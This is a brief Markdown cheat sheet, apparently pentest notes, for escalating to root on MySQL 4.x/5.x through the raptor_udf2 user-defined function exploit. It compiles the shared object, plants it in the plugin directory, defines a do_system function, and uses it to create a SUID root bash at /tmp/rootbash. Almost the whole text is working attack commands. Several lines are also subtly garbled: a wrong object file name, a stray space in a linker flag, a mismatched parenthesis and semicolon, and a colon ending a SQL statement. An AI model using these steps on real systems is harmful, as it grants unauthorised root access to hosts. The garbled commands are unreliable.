# MySQL 4.x/5.x

## Enumerate programs running

```bash
$ ps aux | grep "^root"
```

Example MySQL 4.x/5.0 User-Defined Function

## Compile and Convert the exploit to 64-bit

```bash
$ gcc -g -c raptor_udf2.c -fPIC
```

## Create a shared object from the compiled exploit

```bash
$ gcc -g -shared -Wl, -soname,raptor_udf2.so -o raptor_udf2.so raptor_idf2.p -lc
```

## Connect to mySQL

```bash
$ mysql -u root -p
```

## Steps to load the shared object into MySQL

```bash
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/mrfart/raptor_udf2.so';);
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so':
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
mysql> exit
```

## Execute rootbash shell

```bash
$ /tmp/rootbash
```